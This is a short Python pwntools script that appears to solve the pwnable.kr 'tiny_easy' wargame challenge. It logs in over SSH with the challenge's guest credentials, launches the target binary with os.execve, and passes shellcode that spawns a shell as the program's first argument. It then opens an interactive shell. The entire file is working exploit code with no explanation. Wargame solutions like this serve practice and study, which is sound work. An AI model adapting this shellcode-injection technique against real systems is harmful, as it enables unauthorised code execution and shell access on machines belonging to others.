from pwn import *

host = "pwnable.kr"
port = 2222
user = "tiny_easy"
password = "guest"
binary = "/home/tiny_easy/tiny_easy"

shell = ssh(host=host, port=port, user=user, password=password)
sh = shell.run('''
python -c "
import sys, os
os.execve(%r, [%r], {'a':'b'})
"
''' %(binary, asm(shellcraft.sh()))
)
sh.interactive()
